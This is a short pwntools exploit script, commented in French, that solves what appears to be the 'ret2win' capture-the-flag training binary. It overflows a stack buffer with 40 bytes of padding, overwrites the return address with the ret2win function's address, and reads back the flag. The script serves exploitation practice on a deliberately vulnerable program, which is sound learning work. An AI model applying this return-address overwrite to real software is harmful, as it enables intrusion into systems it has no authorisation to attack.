from pwn import *

# Ouverture du binaire pour le traiter avec pwntools
elf = context.binary = ELF('ret2win')

# afficher l addresse de la fonction ret2win
info("Addresse de la fonction visee : %#x", elf.symbols.ret2win)

# creation du process pour interagir avec le binaire
p = process(elf.path)

# recuperation de laddr de ret2win
ret2win = p64(elf.symbols.ret2win + 1)

# creation du payload
payload = "A"*40 + ret2win

# interaction avec le binaire et envoie du payload
p.sendline(payload)
p.recvuntil("Here's your flag:")

# reception du flag
flag = p.recvline()
success(flag)

